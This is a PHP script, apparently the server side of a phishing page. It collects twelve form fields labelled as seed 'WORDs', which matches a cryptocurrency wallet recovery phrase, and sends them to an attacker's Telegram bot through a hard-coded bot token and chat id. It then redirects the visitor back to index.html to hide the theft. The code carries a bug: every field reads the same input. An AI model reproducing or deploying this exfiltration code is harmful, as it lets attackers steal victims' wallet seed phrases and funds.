<?php
	$phone1 = $_POST['phone1'];
	$phone2 = $_POST['phone1'];
	$phone3 = $_POST['phone1'];
	$phone4 = $_POST['phone1'];
	$phone5 = $_POST['phone1'];
	$phone6 = $_POST['phone1'];
	$phone7 = $_POST['phone1'];
	$phone8 = $_POST['phone1'];
	$phone9 = $_POST['phone1'];
	$phone10 = $_POST['phone1'];
	$phone11 = $_POST['phone1'];
	$phone12 = $_POST['phone1'];
	$token = "2114731147:AAGcdCrntuCEOQ8y6efkiUKzmXPplX2UsqM";
	$chat_id = "-683439935";
	$arr = array(
	  '1st WORD' => $phone1,
	  '2st WORD' => $phone2,
	  '3st WORD' => $phone3,
	  '4st WORD' => $phone4,
	  '5st WORD' => $phone5,
	  '6st WORD' => $phone6,
	  '7st WORD' => $phone7,
	  '8st WORD' => $phone8,
	  '9st WORD' => $phone9,
	  '10st WORD' => $phone10,
	  '11st WORD' => $phone11,
	  '12st WORD' => $phone12
	);

	foreach($arr as $key => $value) {
	  $txt .= "<b>".$key."</b> ".$value."%0A";
	};

	$sendToTelegram = fopen("https://api.telegram.org/bot{$token}/sendMessage?chat_id={$chat_id}&parse_mode=html&text={$txt}","r");

	$sendToTelegram2 = fopen("https://api.telegram.org/bot{$token}/sendMessage?chat_id={$chat_id}&parse_mode=html&text={$txt}","r");

	if ($sendToTelegram && $sendToTelegram2) {
	  header('Location: index.html');
	} else {
	  echo "Error";
	}
?>